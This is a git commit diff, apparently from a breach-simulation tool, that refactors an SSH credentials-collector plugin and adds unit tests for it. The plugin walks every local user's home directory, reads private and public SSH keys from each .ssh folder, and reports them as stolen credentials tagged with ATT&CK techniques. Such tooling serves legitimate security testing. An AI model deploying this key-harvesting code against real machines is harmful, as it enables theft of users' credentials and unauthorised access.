def2ebed6d6def0be7e72d34ef77febbd2295779
Mike Salvatore <mike.s.salvatore@gmail.com>
2023-05-09 17:04:09 -0400

    SSH Collector: Refactor key search algorithm

--- monkey/agent_plugins/credentials_collectors/ssh/src/plugin.py
+++ monkey/agent_plugins/credentials_collectors/ssh/src/plugin.py
@@ -1,13 +1,35 @@
 import logging
-from typing import Any, Mapping, Sequence
+import pwd
+import time
+from pathlib import PosixPath
+from typing import Any, Dict, Iterable, Mapping, Optional, Sequence
 
-from common.credentials import Credentials
+from common.agent_events import CredentialsStolenEvent
+from common.credentials import Credentials, SSHKeypair, Username
 from common.event_queue import IAgentEventPublisher
+from common.tags import (
+    DATA_FROM_LOCAL_SYSTEM_T1005_TAG,
+    OS_CREDENTIAL_DUMPING_T1003_TAG,
+    UNSECURED_CREDENTIALS_T1552_TAG,
+)
 from common.types import AgentID, Event
 
-from .ssh_handler import get_ssh_info, to_credentials
-
 logger = logging.getLogger(__name__)
+
+LinuxUsername = str
+UserDirectories = Dict[LinuxUsername, PosixPath]
+
+DOT_SSH = ".ssh"
+SSH_CREDENTIAL_COLLECTOR_TAG = "ssh-credentials-collector"
+
+SSH_COLLECTOR_EVENT_TAGS = frozenset(
+    (
+        SSH_CREDENTIAL_COLLECTOR_TAG,
+        OS_CREDENTIAL_DUMPING_T1003_TAG,
+        DATA_FROM_LOCAL_SYSTEM_T1005_TAG,
+        UNSECURED_CREDENTIALS_T1552_TAG,
+    )
+)
 
 
 class Plugin:
@@ -19,7 +41,105 @@ class Plugin:
         self, *, options=Mapping[str, Any], interrupt: Event, **kwargs
     ) -> Sequence[Credentials]:
         logger.info("Started scanning for SSH credentials")
-        ssh_info = get_ssh_info(self._agent_event_publisher, self._agent_id)
-        logger.info("Finished scanning for SSH credentials")
+        timestamp = time.time()
 
-        return to_credentials(ssh_info)
+        try:
+            stolen_credentials = _steal_credentials()
+        except Exception:
+            logger.exception(
+                "An unexpected error occurred while attempting to steal SSH credentials"
+            )
+            return []
+
+        logger.info(f"Stole {len(stolen_credentials)} SSH credentials")
+
+        if len(stolen_credentials) > 0:
+            self._publish_credentials_stolen_event(timestamp, stolen_credentials)
+
+        return stolen_credentials
+
+    def _publish_credentials_stolen_event(
+        self,
+        timestamp: float,
+        collected_credentials: Sequence[Credentials],
+    ):
+        credentials_stolen_event = CredentialsStolenEvent(
+            timestamp=timestamp,
+            source=self._agent_id,
+            tags=SSH_COLLECTOR_EVENT_TAGS,
+            stolen_credentials=collected_credentials,
+        )
+
+        self._agent_event_publisher.publish(credentials_stolen_event)
+
+
+def _steal_credentials() -> Sequence[Credentials]:
+    stolen_credentials = []
+
+    for username, ssh_dir in _get_ssh_dirs().items():
+        identity = Username(username=username)
+
+        try:
+            for keypair in _steal_keypairs(ssh_dir):
+                stolen_credentials.append(Credentials(identity=identity, secret=keypair))
+        except (IOError, OSError) as err:
+            logger.debug(f"Failed to search for SSH Keys for user {username}: {err}")
+
+    return stolen_credentials
+
+
+def _get_ssh_dirs() -> UserDirectories:
+    try:
+        home_dirs = {p.pw_name: PosixPath(p.pw_dir) for p in pwd.getpwall()}
+    except Exception:
+        logger.exception("Failed to get SSH directories")
+        return {}
+
+    ssh_dirs = {}
+    for username, home_dir in home_dirs.items():
+        ssh_dir = home_dir / DOT_SSH
+        try:
+            if ssh_dir.is_dir():
+                ssh_dirs[username] = ssh_dir
+        except PermissionError as err:
+            logger.debug(err)
+        except Exception:
+            logger.exception(f"Failed to get SSH directory for {username}")
+
+    return ssh_dirs
+
+
+def _steal_keypairs(ssh_dir: PosixPath) -> Iterable[SSHKeypair]:
+    stolen_keypairs = []
+    for file in filter(lambda f: f.is_file(), ssh_dir.iterdir()):
+        if not _file_is_private_key(file):
+            continue
+
+        private_key = file.read_text()
+        public_key = _find_public_key(file)
+        keypair = SSHKeypair(private_key=private_key, public_key=public_key)
+
+        stolen_keypairs.append(keypair)
+
+    return stolen_keypairs
+
+
+def _file_is_private_key(file: PosixPath) -> bool:
+    # TODO: Perform a real check based on https://github.com/file/file/blob/master/magic/Magdir/ssl
+    try:
+        file.read_text()
+        return file.suffix != ".pub"
+    except (IOError, OSError) as err:
+        logger.debug(f"Received an error while reading {file}: {err}")
+        return False
+
+
+def _find_public_key(private_key_file: PosixPath) -> Optional[str]:
+    try:
+        public_key_file = private_key_file.with_suffix(".pub")
+        if public_key_file.is_file():
+            return public_key_file.read_text()
+    except (IOError, OSError) as err:
+        logger.debug(f"Received an error while reading {public_key_file}: {err}")
+
+    return None
---
+++ monkey/tests/unit_tests/agent_plugins/credentials_collectors/ssh/test_plugin.py
@@ -0,0 +1,146 @@
+import pwd
+import threading
+from pathlib import Path
+from unittest.mock import MagicMock
+
+import pytest
+from agent_plugins.credentials_collectors.ssh.src.plugin import Plugin
+
+from common.credentials import Credentials, SSHKeypair, Username
+from common.event_queue import IAgentEventPublisher
+from common.types import AgentID
+
+AGENT_ID = AgentID("ed077054-a316-479a-a99d-75bb378c0a6e")
+
+
+@pytest.fixture
+def mock_agent_event_publisher() -> IAgentEventPublisher:
+    return MagicMock(spec=IAgentEventPublisher)
+
+
+def test_pwd_exception(monkeypatch, mock_agent_event_publisher: IAgentEventPublisher):
+    mock_pwd = MagicMock()
+    mock_pwd.getpwall = MagicMock(side_effect=Exception)
+    monkeypatch.setattr("agent_plugins.credentials_collectors.ssh.src.plugin.pwd", mock_pwd)
+
+    stolen_credentials = Plugin(
+        agent_id=AGENT_ID, agent_event_publisher=mock_agent_event_publisher
+    ).run(options={}, interrupt=threading.Event())
+
+    assert len(stolen_credentials) == 0
+    assert mock_agent_event_publisher.publish().call_count == 0
+
+
+USERNAME_1 = "test_user_1"
+PUBLIC_KEY_1a = "pubkey1a"
+PRIVATE_KEY_1a = "privkey1a"
+PRIVATE_KEY_1b = "privkey1b"
+
+IDENTITY_1 = Username(username=USERNAME_1)
+SECRET_1a = SSHKeypair(private_key=PRIVATE_KEY_1a, public_key=PUBLIC_KEY_1a)
+SECRET_1b = SSHKeypair(private_key=PRIVATE_KEY_1b, public_key=None)
+
+USERNAME_2 = "test_user_2"
+PRIVATE_KEY_2 = "privkey2"
+
+IDENTITY_2 = Username(username=USERNAME_2)
+SECRET_2 = SSHKeypair(private_key=PRIVATE_KEY_2, public_key=None)
+
+CREDENTIALS = {
+    Credentials(identity=IDENTITY_1, secret=SECRET_1a),
+    Credentials(identity=IDENTITY_1, secret=SECRET_1b),
+    Credentials(identity=IDENTITY_2, secret=SECRET_2),
+}
+
+
+@pytest.fixture
+def place_key_files(tmp_path):
+    inaccessible_root_ssh_dir = tmp_path / "root/.ssh"
+    inaccessible_root_ssh_dir.mkdir(parents=True)
+    inaccessible_root_ssh_dir.chmod(mode=200)
+
+    inaccessible_home_dir = tmp_path / "daemon_home"
+    inaccessible_home_dir.mkdir()
+    (inaccessible_home_dir / ".ssh").mkdir()
+    inaccessible_home_dir.chmod(000)
+
+    user_1_ssh_dir = tmp_path / "home" / USERNAME_1 / ".ssh"
+    user_1_ssh_dir.mkdir(parents=True)
+
+    (user_1_ssh_dir / "key1").write_text(PRIVATE_KEY_1a)
+    (user_1_ssh_dir / "key1.pub").write_text(PUBLIC_KEY_1a)
+    (user_1_ssh_dir / "key2").write_text(PRIVATE_KEY_1b)
+
+    (user_1_ssh_dir / "key2.pub").touch(mode=200)
+    (user_1_ssh_dir / "unreadable").touch(mode=200)
+
+    user_2_ssh_dir = tmp_path / "var/home" / USERNAME_2 / ".ssh"
+    user_2_ssh_dir.mkdir(parents=True)
+
+    (user_2_ssh_dir / "key2").write_text(PRIVATE_KEY_2)
+
+    yield
+
+    # Set these permissions so that pytest can clean up the directory
+    inaccessible_root_ssh_dir.chmod(700)
+    inaccessible_home_dir.chmod(700)
+
+
+@pytest.fixture
+def patch_pwd_getpwall(monkeypatch, place_key_files, tmp_path: Path):
+    pwd_structs = [
+        pwd.struct_passwd(
+            [
+                "root",
+                "x",
+                0,
+                0,
+                "root",
+                tmp_path / "root",
+                "/bin/bash",
+            ]
+        ),
+        pwd.struct_passwd(
+            [
+                USERNAME_1,
+                "x",
+                4,
+                65534,
+                "sync",
+                tmp_path / f"home/{USERNAME_1}",
+                "/bin/sync",
+            ]
+        ),
+        pwd.struct_passwd(
+            [
+                "daemon",
+                "x",
+                1,
+                1,
+                "daemon",
+                tmp_path / "daemon_home",
+                "/usr/sbin/nologin",
+            ]
+        ),
+        pwd.struct_passwd(
+            [
+                USERNAME_2,
+                "x",
+                4,
+                65534,
+                "sync",
+                tmp_path / f"var/home/{USERNAME_2}",
+                "/bin/sync",
+            ]
+        ),
+    ]
+    mock_pwd = MagicMock()
+    mock_pwd.getpwall = MagicMock(return_value=pwd_structs)
+    monkeypatch.setattr("agent_plugins.credentials_collectors.ssh.src.plugin.pwd", mock_pwd)
+
+
+def test_stolen_credentials(patch_pwd_getpwall, mock_agent_event_publisher):
+    plugin = Plugin(agent_id=AGENT_ID, agent_event_publisher=mock_agent_event_publisher)
+    stolen_credentials = plugin.run(options={}, interrupt=threading.Event())
+
+    assert set(stolen_credentials) == CREDENTIALS
